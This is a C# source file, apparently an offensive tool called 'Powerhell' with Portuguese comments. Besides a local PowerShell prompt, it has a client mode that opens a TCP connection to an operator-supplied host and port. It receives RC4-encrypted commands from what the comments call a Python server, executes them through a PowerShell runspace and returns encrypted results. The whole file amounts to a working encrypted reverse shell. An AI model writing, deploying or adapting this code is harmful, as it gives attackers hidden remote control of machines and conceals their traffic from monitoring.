using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Net.Sockets;
using System.Text;
using System.Linq;

namespace Powerhell
{
    internal class Program
    {
        private static string encryptionKey = "";

        private static void Main(string[] args)
        {
            string host = null;
            int port = 0;
            bool useNetwork = false;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-c" && i + 3 < args.Length)
                {
                    useNetwork = true;
                    host = args[i + 1];
                    port = int.Parse(args[i + 2]);
                    encryptionKey = args[i + 3];
                    break;
                }
            }

            if (useNetwork)
            {
                RunClient(host, port);
            }
            else
            {
                RunLocal();
            }
        }

        private static void RunLocal()
        {
            Console.Title = "Mini PowerShell Host - Local";
            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.Open();
                while (true)
                {
                    Console.Write("PS > ");
                    string input = Console.ReadLine();
                    if (string.IsNullOrWhiteSpace(input) || input.ToLower() == "exit") break;
                    Console.WriteLine(ExecuteCommand(runspace, input));
                }
            }
        }

        private static void RunClient(string host, int port)
        {
            try
            {
                using (TcpClient client = new TcpClient(host, port))
                using (NetworkStream stream = client.GetStream())
                using (Runspace runspace = RunspaceFactory.CreateRunspace())
                {
                    runspace.Open();
                    // Buffer ajustado para comandos de rede
                    byte[] buffer = new byte[8192]; 

                    while (true)
                    {
                        // 1. Receber comando do servidor Python
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead == 0) break;

                        // Pegamos apenas os bytes realmente lidos para não descriptografar lixo do buffer
                        byte[] encryptedData = new byte[bytesRead];
                        Array.Copy(buffer, encryptedData, bytesRead);

                        // Descriptografar
                        byte[] decryptedData = RC4(encryptedData, Encoding.UTF8.GetBytes(encryptionKey));
                        string command = Encoding.UTF8.GetString(decryptedData).Trim('\0', ' ', '\n', '\r');

                        if (command.ToLower() == "exit") break;

                        // 2. Executar comando no PowerShell
                        string result = ExecuteCommand(runspace, command);

                        // 3. Preparar resposta (Texto Puro -> UTF8 -> RC4 -> Enviar)
                        // Removi o "PS >" daqui para evitar confusão de loops no servidor Python
                        byte[] responseBytes = Encoding.UTF8.GetBytes(result); 
                        byte[] encryptedResponse = RC4(responseBytes, Encoding.UTF8.GetBytes(encryptionKey));

                        stream.Write(encryptedResponse, 0, encryptedResponse.Length);
                        stream.Flush(); // Garante o envio imediato
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Erro na conexão: " + ex.Message);
            }
        }

        private static string ExecuteCommand(Runspace runspace, string commandText)
        {
            StringBuilder output = new StringBuilder();
            using (PowerShell ps = PowerShell.Create())
            {
                ps.Runspace = runspace;
                ps.AddScript(commandText);

                try
                {
                    Collection<PSObject> results = ps.Invoke();
                    foreach (var obj in results)
                    {
                        if (obj != null)
                            output.AppendLine(obj.ToString());
                    }

                    if (ps.Streams.Error.Count > 0)
                    {
                        foreach (var err in ps.Streams.Error)
                        {
                            output.AppendLine("Erro: " + err.ToString());
                        }
                    }
                }
                catch (Exception ex)
                {
                    output.AppendLine("Erro de execução: " + ex.Message);
                }
            }
            
            // Retorna um aviso se o comando não gerar saída (como comandos de criação de variáveis)
            return output.Length > 0 ? output.ToString() : "Comando executado (sem retorno).\n";
        }

        private static byte[] RC4(byte[] data, byte[] key)
        {
            int[] s = Enumerable.Range(0, 256).ToArray();
            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + s[i] + key[i % key.Length]) % 256;
                int temp = s[i];
                s[i] = s[j];
                s[j] = temp;
            }

            int x = 0, y = 0;
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                x = (x + 1) % 256;
                y = (y + s[x]) % 256;
                int temp = s[x];
                s[x] = s[y];
                s[y] = temp;
                result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) % 256]);
            }
            return result;
        }
    }
}